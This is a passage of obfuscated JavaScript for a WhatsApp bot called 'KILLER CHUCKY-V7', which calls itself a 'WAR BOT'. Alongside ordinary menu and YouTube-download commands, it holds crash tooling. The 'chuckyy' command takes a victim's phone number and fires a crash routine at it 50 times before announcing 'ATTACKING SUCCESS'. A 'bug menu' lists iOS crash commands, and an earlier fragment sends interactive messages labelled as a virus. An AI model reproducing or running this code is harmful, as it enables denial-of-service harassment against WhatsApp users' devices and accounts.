                      title: "「 𝐀𝐓𝐓𝐀𝐂𝐊𝐈𝐍𝐆 𝐒𝐔𝐂𝐂𝐄𝐒𝐒 」\n\n𖥂 𝐓𝐀𝐑𝐆𝐄𝐓 : " + _0x2c52df.split("@")[0] + "\n𖥂 𝐕𝐈𝐑𝐔𝐒 : 𝗜𝗻𝗩𝗶𝘀𝗶𝗯𝗹𝗲 𝐀𝐩𝐢",
                      subtitle: "",
                      hasMediaAttachment: true,
                      ...(await prepareWAMessageMedia(_0x3f1b94, {
                        upload: _0x4b53e5.waUploadToServer
                      }))
                    }),
                    nativeFlowMessage: _0x4d4c71.Message.InteractiveMessage.NativeFlowMessage.create({
                      buttons: [{
                        name: "quick_reply",
                        buttonParamsJson: "{\"display_text\":\"✨⃟༑⌁⃰𝐉𝐚𝐜𝐤 𝐂𝐫𝐚𝐬𝐡 ϟ〽️\",\"id\":\"\"}"
                      }]
                    })
                  })
                }
              }
            }, {});
            await _0x4b53e5.relayMessage(_0x4cd4c9.key.remoteJid, _0x4cd4c9.message, {
              messageId: _0x4cd4c9.key.id
            });
            await donebug(_0x3d8576);
          }
        }
        break;
      case "chuckyy":
        if (!q) {
          return _0x3b9923("Example " + (_0x3a5987 + _0x4ae68c) + " 234xxx");
        }
        target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";
        await _0x3b9923(mess.bugrespon);
        for (let _0x1e38b9 = 0; _0x1e38b9 < 50; _0x1e38b9++) {
          await _0x775651(target);
          chuckylaugh = _0x4d1a4f.readFileSync("/marx/menu.mp3");
        }
        _0x3b9923("\n  『 𝐀𝐓𝐓𝐀𝐂𝐊𝐈𝐍𝐆 𝐒𝐔𝐂𝐂𝐄𝐒𝐒 』\n\n     *𝐊𝐈𝐋𝐋𝚵𝐑 𝐂𝐇𝐔𝐂𝐊𝐘 𝛁𝟕*\n\n𝐓𝐀𝐑𝐆𝐄𝐓 : " + target + "\n𝐒𝐓𝐀𝐓𝐔𝐒 : 𝗦𝘂𝗰𝗰𝗲𝘀𝘀𝗳𝘂𝗹𝗹𝘆\n  ");
        const _0x5b873e = {
          audio: chuckylaugh,
          mimetype: "audio/mp4",
          ptt: true
        };
        await _0x4b53e5.sendMessage(_0x21f0d9.chat, _0x5b873e, {
          quoted: _0x21f0d9
        });
        break;
      case "lolshdgdg":
        {
          let _0x10e22c = [_0x34a350, _0x1fa4e2];
          let _0x44a092 = Math.floor(Math.random() * _0x10e22c.length);
          let _0x4d82c4 = _0x10e22c[_0x44a092];
          let _0x275983 = "\n━━━━━━━━━━━━━━━━\n*𝐊𝐈𝐋𝐋𝚵𝐑 𝐂𝐇𝐔𝐂𝐊𝐘-𝛁𝟕*\n━━━━━━━━━━━━━━━━\n*WAGWAN* *" + _0x21f0d9.pushName + "*\n┗━━━━━━━━━━━━━━━━\n┃ 𝚁𝚄𝙽𝚃𝙸𝙼𝙴  : " + _0x26fa88(process.uptime()) + "\n┗━━━━━━━━━━━━━━━━\n";
          const _0x520d4c = {
            title: "𝐊𝐈𝐋𝐋𝚵𝐑 𝐂𝐇𝐔𝐂𝐊𝐘-𝛁𝟕",
            body: "𝑴𝖆𝖗𝖝 𝕶𝖎𝖓𝖌",
            showAdAttribution: true,
            thumbnail: _0x4d82c4,
            mediaType: 4,
            MediaUrl: "https://whatsapp.com/channel/0029VajFEcFA89MlsCrxbD3s",
            sourceUrl: "https://whatsapp.com/channel/0029VajFEcFA89MlsCrxbD3s"
          };
          const _0x173732 = {
            externalAdReply: _0x520d4c
          };
          const _0x52beaf = {
            video: _0x16b61d,
            caption: _0x275983,
            gifPlayback: true,
            contextInfo: _0x173732
          };
          let _0x523931 = _0x52beaf;
          await _0x4b53e5.sendMessage(_0x21f0d9.chat, _0x523931, {
            quoted: _0x21f0d9
          });
        }
        break;
      case "ownermenu":
        {
          await _0x34c772();
          let _0x12af2e = [_0x34a350, _0x1fa4e2];
          let _0x2e57db = Math.floor(Math.random() * _0x12af2e.length);
          let _0x3f1584 = _0x12af2e[_0x2e57db];
          let _0x5a8777 = "\n━━━━━━━━━━━━━━━━\n*𝐊𝐈𝐋𝐋𝚵𝐑 𝐂𝐇𝐔𝐂𝐊𝐘-𝛁𝟕*\n━━━━━━━━━━━━━━━━\n┏━━━━━━━━━━━━━━━━\n*WAGWAN* *" + _0x21f0d9.pushName + "*\n┗━━━━━━━━━━━━━━━━\n┏━━━━━━━━━━━━━━━━\n┃ 𝚁𝚄𝙽𝚃𝙸𝙼𝙴  : " + _0x26fa88(process.uptime()) + "\n┗━━━━━━━━━━━━━━━━\n┏━━━━━━━━━━━━━━━━\n┃Creator : Marx Alone\n┗━━━━━━━━━━━━━━━\n\n━━━━━━━━━━━━━━━━\n┃" + global.simbol + " ᴀᴅᴅᴘʀᴇᴍ\n┃" + global.simbol + " ᴅᴇʟᴘʀᴇᴍ\n┃" + global.simbol + " sᴇʟғ\n┃" + global.simbol + " ᴘᴜʙʟɪᴄ\n┃" + global.simbol + " ꜱᴇᴛᴘᴘɢᴄ\n┃" + global.simbol + " ʟᴇᴀᴠᴇɢᴄ\n┃" + global.simbol + " ꜱᴇᴛʙɪᴏ\n┃" + global.simbol + " ꜱᴇᴛᴘᴘ\n┃" + global.simbol + " ᴅᴇʟᴘᴘ\n┃" + global.simbol + " ʟɪꜱᴛʙʟᴏᴄᴋ\n┃" + global.simbol + " ʙʟᴏᴄᴋ\n┃" + global.simbol + " ᴜɴʙʟᴏᴄᴋ\n┃" + global.simbol + " ᴀᴅᴅ\n┃" + global.simbol + " ᴋɪᴄᴋ\n┃" + global.simbol + " ᴊᴏɪɴ\n┃" + global.simbol + " ꜱᴇᴛɢᴄɴᴀᴍᴇ\n┃" + global.simbol + " ʟɪɴᴋɢc\n┃" + global.simbol + " ʀᴇꜱᴇᴛʟɪɴᴋɢᴄ\n┃" + global.simbol + " ᴘʀᴏᴍᴏᴛᴇ\n┃" + global.simbol + " ᴅᴇᴍᴏᴛᴇ\n┃" + global.simbol + " ʜɪᴅᴇᴛᴀɢ\n┃" + global.simbol + " ᴅᴇᴠɪᴄᴇɪɴꜰᴏ\n┃" + global.simbol + " ʙᴏᴛɪɴꜰᴏ\n┃" + global.simbol + " mute\n┃" + global.simbol + " unmute\n┃" + global.simbol + " Ban\n┃" + global.simbol + " Del\n" + global.end + "\n    ";
          const _0x39aa54 = {
            title: "𝐊𝐈𝐋𝐋𝚵𝐑 𝐂𝐇𝐔𝐂𝐊𝐘-𝛁𝟕",
            body: "𝑴𝖆𝖗𝖝 𝕶𝖎𝖓𝖌",
            showAdAttribution: true,
            thumbnail: _0x3f1584,
            mediaType: 4,
            mediaUrl: "https://whatsapp.com/channel/0029VajFEcFA89MlsCrxbD3s",
            sourceUrl: "https://whatsapp.com/channel/0029VajFEcFA89MlsCrxbD3s"
          };
          const _0x696497 = {
            externalAdReply: _0x39aa54
          };
          const _0x3f5bde = {
            image: _0x34a350,
            caption: _0x5a8777,
            contextInfo: _0x696497
          };
          let _0x501071 = _0x3f5bde;
          await _0x4b53e5.sendMessage(_0x21f0d9.chat, _0x501071, {
            quoted: _0x21f0d9
          });
          break;
        }
      case "menu":
        {
          let _0x34b2ee = "\n━━━━━━━━━━━━━━━━\n\n   `𝐊𝐈𝐋𝐋𝚵𝐑 𝐂𝐇𝐔𝐂𝐊𝐘-𝛁𝟕`\n   \n━━━━━━━━━━━━━━━━         \n┏━━━━━━━━━━━\n┃  *WAGWAN*\n┃             " + _0x45dcac + "\n┃ " + _0x57ad6.split("@")[0] + "\n┃  𝚁𝚄𝙽𝚃𝙸𝙼𝙴  : " + _0x26fa88(process.uptime()) + "\n┗━━━━━━━━━━\n\n" + global.start + "\n" + global.line + " 𝐊𝐈𝐋𝐋𝚵𝐑 𝐂𝐇𝐔𝐂𝐊𝐘-𝛁𝟕 *IS A WAR BOT*\n" + global.line + " *Created by " + global.namaown + "*\n" + global.end + "\n" + global.start + "\n" + global.line + " `WELCOME TO A NEW ERA`\n" + global.line + "\n" + global.line + " *Andriod users proceed with allmenu*\n" + global.line + " *Ios users proceed with imenu*\n" + global.line + "> *NOTE*\n" + global.line + " Use responsibly and we\n" + global.line + " wont be held responsible if you\n" + global.line + " penalized by whatsapp due to misuse\n" + global.line + " \n" + global.end + "\n\n" + global.start + "  \n" + global.line + " `KCV7 MENU`\n" + global.line + " HELP\n" + global.line + " iMENU\n" + global.line + " MENU\n" + global.line + " FUNMENU\n" + global.line + " BUGMENU\n" + global.line + " OWNERMENU\n" + global.line + " NSFWMENU\n" + global.line + " ALLMENU\n" + global.line + " CHECKTRIAL\n━━━━━━━━━━━━━━━━\n> © " + global.inc + "\n━━━━━━━━━━━━━━━━\n  ";
          const _0x263ba7 = {
            video: {
              url: "./menu.mp4"
            },
            caption: _0x34b2ee,
            gifPlayback: true
          };
          _0x4b53e5.sendMessage(_0x21f0d9.chat, _0x263ba7, {
            quoted: _0x21f0d9
          });
        }
        break;
      case "botinfo":
        {
          let _0x1ebdfb = [_0x34a350, _0x1fa4e2];
          let _0x4dccf3 = Math.floor(Math.random() * _0x1ebdfb.length);
          let _0xe7c873 = _0x1ebdfb[_0x4dccf3];
          let _0x463c13 = "\n ━━━━━━━━━━━━━━━━\n*𝐊𝐈𝐋𝐋𝚵𝐑 𝐂𝐇𝐔𝐂𝐊𝐘-𝛁𝟕*\n━━━━━━━━━━━━━━━━\n┏━━━━━━━━━━━━━━━━\n*WAGWAN* *" + _0x21f0d9.pushName + "*\n┗━━━━━━━━━━━━━━━━\n┏━━━━━━━━━━━━━━━━\n┃ 𝚁𝚄𝙽𝚃𝙸𝙼𝙴  : " + _0x26fa88(process.uptime()) + "\n┗━━━━━━━━━━━━━━━━\n┏━━━━━━━━━━━━━━━━\n┃Creator : Marx Alone\n┗━━━━━━━━━━━━━━━━\n\n" + global.start + "\n" + global.line + " *BOT NAME* : " + global.namabot + "\n" + global.mid + "\n" + global.line + " *BOT MODEL* : *Chucky-V748E*\n" + global.mid + "\n" + global.line + " *BOT VERSION* : *7*\n" + global.mid + "\n" + global.line + " *Build number* : *V748E-CH64KL*\n" + global.mid + "\n" + global.line + " *BETA* : *TRUE*\n" + global.end + "\n\n" + global.mid + "\n> " + global.namaown + " \n" + global.mid + "\n";
          const _0xc9027a = {
            title: "𝐊𝐈𝐋𝐋𝚵𝐑 𝐂𝐇𝐔𝐂𝐊𝐘-𝛁𝟕",
            body: "𝑴𝖆𝖗𝖝 𝕶𝖎𝖓𝖌",
            showAdAttribution: true,
            thumbnail: _0xe7c873,
            mediaType: 4,
            MediaUrl: "https://whatsapp.com/channel/0029VajFEcFA89MlsCrxbD3s",
            sourceUrl: "https://whatsapp.com/channel/0029VajFEcFA89MlsCrxbD3s"
          };
          const _0x21e6ff = {
            externalAdReply: _0xc9027a
          };
          const _0x366a4a = {
            video: _0x16b61d,
            caption: _0x463c13,
            gifPlayback: true,
            contextInfo: _0x21e6ff
          };
          let _0x5b7ab2 = _0x366a4a;
          await _0x4b53e5.sendMessage(_0x21f0d9.chat, _0x5b7ab2, {
            quoted: _0x21f0d9
          });
          try {
            let _0x3c8979 = _0x4d1a4f.readFileSync("./marx/menu.mp3");
            const _0x22f6f2 = {
              audio: _0x3c8979,
              mimetype: "audio/mpeg",
              ptt: true,
              caption: "𝐊𝐈𝐋𝐋𝚵𝐑 𝐂𝐇𝐔𝐂𝐊𝐘-𝛁𝟕"
            };
            await _0x4b53e5.sendMessage(_0x21f0d9.chat, _0x22f6f2, {
              quoted: _0x21f0d9
            });
          } catch (_0x5ade5f) {
            console.error("Failed to send audio:", _0x5ade5f);
          }
        }
        break;
      case "play":
        {
          if (!_0x40d288) {
            return _0x3b9923("*Example :*\n\n*Play Mendua*");
          }
          _0x3b9923(mess.wait);
          let _0x189c82 = require("youtube-yts");
          let _0x2e4540 = await _0x189c82(_0x40d288);
          let _0x79611f = _0x2e4540.videos[0];
          const _0x28cae7 = await youtube(_0x79611f.url);
          const _0x5f48db = {
            url: _0x28cae7.mp3
          };
          const _0x407b4f = {
            quoted: _0x21b594
          };
          await _0x4b53e5.sendMessage(_0x21f0d9.chat, {
            audio: _0x5f48db,
            fileName: _0x79611f.title + ".mp3",
            mimetype: "audio/mpeg",
            contextInfo: {
              externalAdReply: {
                title: _0x79611f.title,
                body: packname,
                thumbnailUrl: _0x79611f.image,
                sourceUrl: _0x28cae7.mp3,
                mediaType: 1,
                mediaUrl: _0x79611f.url
              }
            }
          }, _0x407b4f);
        }
        break;
      case "plbbsbbday":
        {
          const _0x3c479b = require("axios");
          const _0x165cd7 = ["audio", "video"];
          const _0x1fab6d = [320, 256, 192, 128, 64];
          const _0x3eee97 = ["360p", "480p", "720p", "1080p"];
          const _0x3ae917 = {
            getToken: async _0x3b2f1e => {
              const _0x4d4221 = _0x4e38ee => {
                const _0x7df7d5 = /(?:https?:\/\/)?(?:www\.)?(?:youtube\.com\/watch\?v=|youtu\.be\/)([a-zA-Z0-9_-]{11})/;
                const _0x15729c = _0x4e38ee.match(_0x7df7d5);
                if (_0x15729c) {
                  return _0x15729c[1];
                } else {
                  return null;
                }
              };
              const _0x395372 = _0x4d4221(_0x3b2f1e);
              if (!_0x395372) {
                throw new Error("ID videonya gk ketemu jir, pastikan link youtube yak");
              }
              const _0x1958b1 = {
                method: "GET",
                url: "https://dd-n01.yt2api.com/api/v4/info/" + _0x395372,
                headers: {}
              };
              _0x1958b1.headers["User-Agent"] = "Mozilla/5.0 (Android 10; Mobile; rv:131.0) Gecko/131.0 Firefox/131.0";
              _0x1958b1.headers.Accept = "application/json";
              _0x1958b1.headers["accept-language"] = "id-ID";
              _0x1958b1.headers.referer = "https://bigconv.com/";
              _0x1958b1.headers.origin = "https://bigconv.com";
              _0x1958b1.headers["alt-used"] = "dd-n01.yt2api.com";
              _0x1958b1.headers["sec-fetch-dest"] = "empty";
              _0x1958b1.headers["sec-fetch-mode"] = "cors";
              _0x1958b1.headers["sec-fetch-site"] = "cross-site";
              _0x1958b1.headers.priority = "u=0";
              _0x1958b1.headers.te = "trailers";
              const _0x19d3cc = _0x1958b1;
              const _0xe705b7 = await _0x3c479b.request(_0x19d3cc);
              const _0x21b17c = _0xe705b7.headers["set-cookie"];
              const _0x3dd5dd = _0x21b17c ? _0x21b17c[0].split(";")[0] : "";
              const _0x20a7b3 = _0xe705b7.headers.authorization || "";
              const _0x5d27a4 = {
                data: _0xe705b7.data,
                cookie: _0x3dd5dd,
                authorization: _0x20a7b3
              };
              const _0x56dec4 = _0x5d27a4;
              return _0x56dec4;
            },
            convert: async (_0x56b6e9, _0x1cbd95, _0x5eb135) => {
              const _0x146585 = await _0x3ae917.getToken(_0x56b6e9);
              const _0x24a4a0 = _0x146585.data.formats;
              let _0x596822;
              if (_0x1cbd95 === "audio") {
                const _0x563b9d = _0x24a4a0.audio.mp3;
                const _0x362471 = _0x563b9d.find(_0x397938 => _0x397938.quality === _0x5eb135);
                if (_0x362471) {
                  _0x596822 = _0x362471.token;
                } else {
                  throw new Error("Kualitas audio " + _0x5eb135 + " tidak tersedia.");
                }
              } else if (_0x1cbd95 === "video") {
                const _0x58dbbd = _0x24a4a0.video.mp4;
                const _0x5d0826 = _0x58dbbd.find(_0xc6ca5a => _0xc6ca5a.quality === _0x5eb135);
                if (_0x5d0826) {
                  _0x596822 = _0x5d0826.token;
                } else {
                  throw new Error("Kualitas video " + _0x5eb135 + " tidak tersedia.");
                }
              } else {
                throw new Error("Format tidak dikenali. Gunakan \"audio\" atau \"video\".");
              }
              const _0x49f864 = {
                token: _0x596822
              };
              const _0x132663 = JSON.stringify(_0x49f864);
              const _0xbcdff = {
                method: "POST",
                url: "https://dd-n01.yt2api.com/api/v4/convert",
                headers: {},
                data: _0x132663
              };
              _0xbcdff.headers["User-Agent"] = "Mozilla/5.0 (Android 10; Mobile; rv:131.0) Gecko/131.0 Firefox/131.0";
              _0xbcdff.headers.Accept = "application/json";
              _0xbcdff.headers["Content-Type"] = "application/json";
              _0xbcdff.headers["accept-language"] = "id-ID";
              _0xbcdff.headers.referer = "https://bigconv.com/";
              _0xbcdff.headers.origin = "https://bigconv.com";
              _0xbcdff.headers["sec-fetch-dest"] = "empty";
              _0xbcdff.headers["sec-fetch-mode"] = "cors";
              _0xbcdff.headers["sec-fetch-site"] = "cross-site";
              _0xbcdff.headers.priority = "u=0";
              _0xbcdff.headers.te = "trailers";
              _0xbcdff.headers.Cookie = _0x146585.cookie;
              _0xbcdff.headers.authorization = _0x146585.authorization;
              const _0x96979c = _0xbcdff;
              const _0x416da3 = await _0x3c479b.request(_0x96979c);
              const _0x5ce269 = {
                jobId: _0x416da3.data.id,
                cookie: _0x146585.cookie,
                authorization: _0x146585.authorization
              };
              return _0x5ce269;
            },
            download: async (_0x260961, _0x490919, _0x1fafa9) => {
              const {
                jobId: _0x46481b,
                cookie: _0x4fdbfc,
                authorization: _0x5e8d9c
              } = await _0x3ae917.convert(_0x260961, _0x490919, _0x1fafa9);
              return new Promise((_0x196455, _0x504609) => {
                const _0x40753b = async () => {
                  const _0x5df316 = {
                    method: "GET",
                    url: "https://dd-n01.yt2api.com/api/v4/status/" + _0x46481b,
                    headers: {}
                  };
                  _0x5df316.headers["User-Agent"] = "Mozilla/5.0 (Android 10; Mobile; rv:131.0) Gecko/131.0 Firefox/131.0";
                  _0x5df316.headers.Accept = "application/json";
                  _0x5df316.headers["accept-language"] = "id-ID";
                  _0x5df316.headers.referer = "https://bigconv.com/";
                  _0x5df316.headers.origin = "https://bigconv.com";
                  _0x5df316.headers["sec-fetch-dest"] = "empty";
                  _0x5df316.headers["sec-fetch-mode"] = "cors";
                  _0x5df316.headers["sec-fetch-site"] = "cross-site";
                  _0x5df316.headers.priority = "u=4";
                  _0x5df316.headers.te = "trailers";
                  _0x5df316.headers.Cookie = _0x4fdbfc;
                  _0x5df316.headers.authorization = _0x5e8d9c;
                  const _0x25c523 = _0x5df316;
                  const _0x522491 = await _0x3c479b.request(_0x25c523);
                  console.log(_0x522491.data);
                  if (_0x522491.data.status === "completed") {
                    clearInterval(_0x435591);
                    _0x196455(_0x522491.data);
                  } else if (_0x522491.data.status === "failed") {
                    clearInterval(_0x435591);
                    _0x196455(_0x522491.data);
                  } else {
                    console.log("Status belum complete, wet iam cek lagi...");
                  }
                };
                const _0x435591 = setInterval(_0x40753b, 5000);
              });
            }
          };
          if (!_0x40d288) {
            return _0x3b9923("whats the name of the song?");
          }
          const _0x4cc885 = await yts(_0x40d288);
          const _0x3c5974 = _0x4cc885.all[0];
          if (!_0x3c5974 || _0x3c5974 === 0) {
            _0x3b9923("The song you are looking for cant be found");
          }
          let _0x17b466 = "╭──── *[ ʀᴇǫᴜᴇsᴛ - ᴘʟᴀʏ ]* ──々\n";
          _0x17b466 += "│ =〆 ᴊᴜᴅᴜʟ : " + _0x3c5974.title + "\n";
          _0x17b466 += "│ =〆 ᴇxᴛ : sᴇᴀʀᴄʜ\n";
          _0x17b466 += "│ =〆 ɪᴅ : " + _0x3c5974.videoId + "\n";
          _0x17b466 += "│ =〆 ᴅᴜʀᴀᴛɪᴏɴ : " + _0x3c5974.timestamp + "\n";
          _0x17b466 += "│ =〆 ᴠɪᴇᴡᴇʀ𝘴 : " + _0x3c5974.views + "\n";
          _0x17b466 += "│ =〆 ᴛᴀɴɢɢᴀʟ ᴜᴘʟᴏᴀᴅ : " + _0x3c5974.ago + "\n";
          _0x17b466 += "│ =〆 ᴀᴜᴛʜᴏʀ : " + _0x3c5974.author.name + "\n";
          _0x17b466 += "│ =〆 ᴄʜᴀɴɴᴇʟ : " + _0x3c5974.author.url + "\n";
          _0x17b466 += "│ =〆 ᴅᴇ𝘴ᴄʀɪᴘᴛɪᴏɴ : " + _0x3c5974.description + "\n";
          _0x17b466 += "│ =〆 ᴜʀʟ : " + _0x3c5974.url + "\n";
          _0x17b466 += "╰─々";
          const _0x203f64 = {
            title: _0x3c5974.title,
            mediaType: 1,
            previewType: 1,
            body: "Duration : " + _0x3c5974.timestamp + " / View : " + _0x3c5974.views,
            thumbnailUrl: _0x3c5974.image,
            renderLargerThumbnail: true,
            mediaUrl: _0x3c5974.url,
            sourceUrl: _0x3c5974.url
          };
          const _0x5dcbbf = {
            forwardingScore: 999,
            isForwarded: true,
            externalAdReply: _0x203f64
          };
          const _0x1f0c1f = {
            text: _0x17b466,
            contextInfo: _0x5dcbbf
          };
          const _0x1dcf83 = {
            quoted: leogg
          };
          await _0x4b53e5.sendMessage(_0x21f0d9.chat, _0x1f0c1f, _0x1dcf83);
          try {
            let _0x5eba11 = await _0x3ae917.download(_0x3c5974.url, "video", "360p");
            const _0x1c3761 = {
              url: _0x5eba11.download
            };
            const _0x53689c = {
              title: _0x3c5974.title,
              mediaType: 1,
              previewType: 1,
              body: "Durasi : " + _0x3c5974.timestamp + " / View : " + _0x3c5974.views,
              thumbnailUrl: _0x3c5974.image,
              renderLargerThumbnail: true,
              mediaUrl: _0x3c5974.url,
              sourceUrl: _0x3c5974.url
            };
            const _0x47f746 = {
              forwardingScore: 999,
              isForwarded: true,
              externalAdReply: _0x53689c
            };
            const _0xa00686 = {
              audio: _0x1c3761,
              mimetype: "audio/mpeg",
              contextInfo: _0x47f746
            };
            const _0x1d9ddf = {
              quoted: leogg
            };
            await _0x4b53e5.sendMessage(_0x21f0d9.chat, _0xa00686, _0x1d9ddf);
          } catch (_0x4bd3f6) {
            _0x3b9923("sorry bruh..., can you try again...");
          }
        }
        break;
      case "bugfgtgfgfgdffmenu":
        const _0x1e2066 = {
          image: _0x34a350
        };
        const _0x146a4f = {
          upload: _0x4b53e5.waUploadToServer
        };
        const _0x536dbd = {
          image: _0x34a350
        };
        const _0x32f3b0 = {
          upload: _0x4b53e5.waUploadToServer
        };
        const _0x2df264 = {
          image: _0x34a350
        };
        const _0x17910b = {
          upload: _0x4b53e5.waUploadToServer
        };
        const _0x2f9b24 = {
          image: _0x34a350
        };
        const _0xcdfcc2 = {
          upload: _0x4b53e5.waUploadToServer
        };
        const _0x203077 = {
          image: _0x34a350
        };
        const _0x268db6 = {
          upload: _0x4b53e5.waUploadToServer
        };
        msg = _0x770315(_0x22a0dd, {
          viewOnceMessage: {
            message: {
              messageContextInfo: {
                deviceListMetadata: {},
                deviceListMetadataVersion: 2
              },
              interactiveMessage: _0xda26e2.Message.InteractiveMessage.fromObject({
                body: _0xda26e2.Message.InteractiveMessage.Body.create({
                  text: "\n            𝐊𝐈𝐋𝐋𝚵𝐑 𝐂𝐇𝐔𝐂𝐊𝐘-𝛁𝟕\n\n            *Christmas Crasher 😈*"
                }),
                footer: _0xda26e2.Message.InteractiveMessage.Footer.create({
                  text: "Marx Alone"
                }),
                header: _0xda26e2.Message.InteractiveMessage.Header.create({
                  hasMediaAttachment: false
                }),
                carouselMessage: _0xda26e2.Message.InteractiveMessage.CarouselMessage.fromObject({
                  cards: [{
                    body: _0xda26e2.Message.InteractiveMessage.Body.fromObject({}),
                    footer: _0xda26e2.Message.InteractiveMessage.Footer.fromObject({}),
                    header: _0xda26e2.Message.InteractiveMessage.Header.fromObject({
                      title: "ℭ𝔥𝔲𝔠𝚔𝔶 𝔅𝔲𝔤 𝔪𝔢𝔫𝔲 1",
                      hasMediaAttachment: true,
                      ...(await prepareWAMessageMedia(_0x1e2066, _0x146a4f))
                    }),
                    nativeFlowMessage: _0xda26e2.Message.InteractiveMessage.NativeFlowMessage.fromObject({
                      buttons: [{
                        name: "quick_reply",
                        buttonParamsJson: JSON.stringify({
                          display_text: "\n 𝐊𝐈𝐋𝐋𝚵𝐑 𝐂𝐇𝐔𝐂𝐊𝐘-𝛁𝟕\n ━━━━━━━━━━━━━━━━━\n> *IOS BUG MENU*\n┏━━━━━━━━━━━━━━━━━\n┃ " + global.simbol + " ios18\n┃ " + global.simbol + " ios17\n┃ " + global.simbol + " slay-ios\n┃ " + global.simbol + " off-ios\n┃ " + global.simbol + " bang-ios\n┃ " + global.simbol + " kingmarx\n┃ " + global.simbol + " frezze-ios\n┃ " + global.simbol + " blast-ios\n┃ " + global.simbol + " x-ios\n┗━━━━━━━━━━━━━━━━━",
                          id: ".ibugmenu1"
                        })
                      }]
                    })
                  }, {
                    body: _0xda26e2.Message.InteractiveMessage.Body.fromObject({}),
                    footer: _0xda26e2.Message.InteractiveMessage.Footer.fromObject({}),
                    header: _0xda26e2.Message.InteractiveMessage.Header.fromObject({
                      title: "ℭ𝔥𝔲𝔠𝚔𝔶 𝔅𝔲𝔤 𝔪𝔢𝔫𝔲 2",
                      hasMediaAttachment: true,
                      ...(await prepareWAMessageMedia(_0x536dbd, _0x32f3b0))
                    }),
                    nativeFlowMessage: _0xda26e2.Message.InteractiveMessage.NativeFlowMessage.fromObject({
                      buttons: [{
                        name: "quick_reply",
                        buttonParamsJson: JSON.stringify({
                          display_text: "",
                          id: ".ibugmenu2"
                        })
                      }]
                    })
                  }, {
                    body: _0xda26e2.Message.InteractiveMessage.Body.fromObject({}),
                    footer: _0xda26e2.Message.InteractiveMessage.Footer.fromObject({}),
                    header: _0xda26e2.Message.InteractiveMessage.Header.fromObject({
                      title: "ℭ𝔥𝔲𝔠𝚔𝔶 𝔅𝔲𝔤 𝔪𝔢𝔫𝔲 3",
                      hasMediaAttachment: true,
                      ...(await prepareWAMessageMedia(_0x2df264, _0x17910b))
                    }),
                    nativeFlowMessage: _0xda26e2.Message.InteractiveMessage.NativeFlowMessage.fromObject({
                      buttons: [{
                        name: "quick_reply",
                        buttonParamsJson: JSON.stringify({
                          display_text: "𝔒𝔭𝔢𝔫 ℭ𝔥𝔲𝔠𝚔𝔶 𝔅𝔲𝔤 𝔪𝔢𝔫𝔲 v3",
                          id: ".bugmenuv3"
                        })
                      }]
                    })
                  }, {
                    body: _0xda26e2.Message.InteractiveMessage.Body.fromObject({}),
                    footer: _0xda26e2.Message.InteractiveMessage.Footer.fromObject({}),
                    header: _0xda26e2.Message.InteractiveMessage.Header.fromObject({
                      title: "ℭ𝔥𝔲𝔠𝚔𝔶 𝔅𝔲𝔤 𝔪𝔢𝔫𝔲 𝔳𝔦𝔭",
                      hasMediaAttachment: true,
                      ...(await prepareWAMessageMedia(_0x2f9b24, _0xcdfcc2))
                    }),
                    nativeFlowMessage: _0xda26e2.Message.InteractiveMessage.NativeFlowMessage.fromObject({
                      buttons: [{
                        name: "quick_reply",
                        buttonParamsJson: JSON.stringify({
                          display_text: "𝔒𝔭𝔢𝔫 ℭ𝔥𝔲𝔠𝚔𝔶 𝔅𝔲𝔤 𝔪𝔢𝔫𝔲 𝔳𝔦𝔭",
                          id: ".bugmenuvip"
                        })
                      }]
                    })
                  }, {
                    body: _0xda26e2.Message.InteractiveMessage.Body.fromObject({}),
                    footer: _0xda26e2.Message.InteractiveMessage.Footer.fromObject({}),
                    header: _0xda26e2.Message.InteractiveMessage.Header.fromObject({
                      title: "All Bug Menu",
                      hasMediaAttachment: true,
                      ...(await prepareWAMessageMedia(_0x203077, _0x268db6))
                    }),
                    nativeFlowMessage: _0xda26e2.Message.InteractiveMessage.NativeFlowMessage.fromObject({
                      buttons: [{
                        name: "quick_reply",
                        buttonParamsJson: JSON.stringify({
                          display_text: "Open All Bug Menu",
                          id: ".allbugmenu"
                        })
                      }]
                    })
                  }]
                })
              })
            }
          }
        }, {});
        await _0x4b53e5.relayMessage(_0x22a0dd, msg.message, {
          messageId: msg.key.id
        });
        break;
      case "imenu":
        {
          let _0x59917a = [_0x34a350, _0x1fa4e2];
          let _0x1ceba9 = Math.floor(Math.random() * _0x59917a.length);
          let _0x4ff1b6 = _0x59917a[_0x1ceba9];
          let _0x368d49 = "\n━━━━━━━━━━━━━━━━\n*𝐊𝐈𝐋𝐋𝚵𝐑 𝐂𝐇𝐔𝐂𝐊𝐘-𝛁𝟕*\n━━━━━━━━━━━━━━━━\n┏━━━━━━━━━━━━━━━\n*WAGWAN* *" + _0x21f0d9.pushName + "*\n┗━━━━━━━━━━━━━━━\n┏━━━━━━━━━━━━━━━\n┃ 𝚁𝚄𝙽𝚃𝙸𝙼𝙴  : " + _0x26fa88(process.uptime()) + "\n┗━━━━━━━━━━━━━━━\n┏━━━━━━━━━━━━━━━\n┃Creator : Marx Alone\n┗━━━━━━━━━━━━━━━\n┏━━━━━━━━━━━━━━━\n> 𝙄𝙊𝙎 𝙈𝙀𝙉𝙐  \n┗━━━━━━━━━━━━━━━\n> *OWNER MENU*\n┏━━━━━━━━━━━━━━━\n┃" + global.simbol + " ᴀᴅᴅᴘʀᴇᴍ\n┃" + global.simbol + " ᴅᴇʟᴘʀᴇᴍ\n┃" + global.simbol + " sᴇʟғ\n┃" + global.simbol + " ᴘᴜʙʟɪᴄ\n┃" + global.simbol + " ꜱᴇᴛᴘᴘɢᴄ\n┃" + global.simbol + " ʟᴇᴀᴠᴇɢᴄ\n┃" + global.simbol + " ꜱᴇᴛʙɪᴏ\n┃" + global.simbol + " ꜱᴇᴛᴘᴘ\n┃" + global.simbol + " ᴅᴇʟᴘᴘ\n┃" + global.simbol + " ʟɪꜱᴛʙʟᴏᴄᴋ\n┃" + global.simbol + " ʙʟᴏᴄᴋ\n┃" + global.simbol + " ᴜɴʙʟᴏᴄᴋ\n┃" + global.simbol + " ᴀᴅᴅ\n┃" + global.simbol + " ᴋɪᴄᴋ\n┃" + global.simbol + " ᴊᴏɪɴ\n┃" + global.simbol + " ꜱᴇᴛɢᴄɴᴀᴍᴇ\n┃" + global.simbol + " ʟɪɴᴋɢꜱ\n┃" + global.simbol + " ʀᴇꜱᴇᴛʟɪɴᴋɢᴄ\n┃" + global.simbol + " ᴘʀᴏᴍᴏᴛᴇ\n┃" + global.simbol + " ᴅᴇᴍᴏᴛᴇ\n┃" + global.simbol + " ʜɪᴅᴇᴛᴀɢ\n┃" 